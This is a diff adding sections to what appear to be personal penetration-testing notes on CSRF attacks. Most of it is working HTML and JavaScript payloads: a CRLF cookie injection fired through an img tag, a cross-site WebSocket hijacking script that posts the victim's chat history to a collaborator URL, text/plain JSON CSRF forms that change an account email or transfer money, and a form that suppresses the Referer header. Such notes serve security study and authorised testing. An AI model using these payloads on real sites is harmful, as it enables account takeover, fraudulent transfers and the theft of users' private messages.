@@ -87,3 +87,74 @@ exploit();
 #### step2: using img tag for delivering the crafted link
 
 >1. `<img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`
+
+### cross-site WebSocket hijacking (CSWSH)
+- no csrf token => loads all the chat history
+```html
+<script>
+    var ws = new WebSocket('wss://your-websocket-url');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+
+```
+
+### Content-Type based CSRF
+#### json-CSRF
+- ![[Pasted image 20251123170930.png]]
+- ![[Pasted image 20251123171000.png]]
+
+Usually, JSON is CSRF-safe(why? ->AJAX -> SOP), but only when requests with content-type other than application/json gets rejected or additional CSRF protection is in place (Authorization headers/API keys).
+
+```html
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="https://app.example.com/api/profile/update" method="POST" enctype="text/plain">
+      <input type="hidden" name='{"test":"x' value='y","new_email":"attacker@example.com"}'/>
+      <input type="submit" value="Submit request"/>
+    </form>
+    <script>history.pushState('','','/');document.forms[0].submit();</script>
+  </body>
+</html>
+```
+[POC for json-CSRF ](https://hackerone.com/reports/245346) -> uses ==text/plain== 
+```html 
+<html>
+  <body>
+    <form action="https://members.bankofdirectdefense.com/accounts/transfer" method="POST" enctype="text/plain">
+      <input type="hidden" name="{\"from-account\": 1,\"toAccount\": \"021000021-9876543210\",\"amount\": 1000,\"currency\": \"USD\",\"foo" value="\":\"bar\"}" />
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
+</html>
+```
+also test application/x-www-form-urlencoded and multipart/form-data
+
+### Referrer-based CSRF
+
+- Bypass checker function:
+  ![[Pasted image 20251123173420.png]]
+	- ![[Pasted image 20251123173431.png]]
+- POC with No Referrer header:
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <!-- Prevent referer header from being sent -->
+    <meta name="referrer" content="no-referrer">
+  </head>
+  <body>
+    <form action="https://app.example.com/api/profile/update" method="POST">
+      <input type="hidden" name="new_email" value="attacker@example.com"/>
+      <input type="submit" value="Submit request"/>
+    </form>
+    <script>history.pushState('','','/');document.forms[0].submit();</script>
+  </body>
+</html>
+```
